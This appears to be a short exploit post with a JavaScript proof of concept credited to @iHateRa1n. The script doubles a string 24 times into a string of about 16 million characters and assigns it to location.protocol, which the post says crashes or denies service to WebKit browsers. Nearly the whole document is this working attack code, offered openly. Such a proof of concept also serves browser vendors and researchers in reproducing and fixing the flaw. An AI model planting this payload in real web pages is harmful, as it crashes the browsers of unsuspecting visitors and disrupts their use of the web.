# WebKit DoS or crash by flooding location.protocol

location.protocol can DoS or crash WebKit, with a large String.

PoC (@iHateRa1n):

```javascript
var s="A";
var k=24;

function repeat(s,k){
    n=0;
    j=s;
    while(n<k){
        j+=j;
        n++;
    }
    return j;
}

function exploit(s){
    location.protocol=s;
}

s=repeat(s,k);

exploit(s);
```

WebKit DoS discovered, and exploited by @iHateRa1n. 

PS-2018-7641
